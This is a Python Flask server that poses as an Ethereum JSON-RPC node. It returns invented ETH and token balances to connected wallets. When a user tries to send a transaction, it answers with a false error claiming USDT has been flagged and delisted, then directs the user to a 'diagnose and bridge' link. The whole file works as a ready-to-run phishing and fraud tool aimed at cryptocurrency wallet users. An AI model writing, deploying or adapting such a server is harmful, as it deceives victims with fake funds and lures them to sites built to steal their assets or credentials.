from flask import Flask, request, jsonify
import os

app = Flask(__name__)

@app.route('/', methods=['POST'])
def rpc_handler():
    data = request.get_json()
    method = data.get("method")
    req_id = data.get("id")
    params = data.get("params")

    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x539"})

    if method == "eth_getBalance":
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0xde0b6b3a764000"})

    if method == "eth_call":
        if params and params[0].get("data", "").startswith("0x70a08231"):
            return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x8ac7230489e80000"})
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x"})

    if method == "eth_sendRawTransaction":
        return jsonify({
            "jsonrpc": "2.0",
            "id": req_id,
            "error": {
                "code": -32000,
                "message": "USDT Flagged and Delisted in the EU and Parts of the USA, Diagnose and bridge here (www.xxxxxxxx.)"
            }
        })

    return jsonify({"jsonrpc": "2.0", "id": req_id, "result": None})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
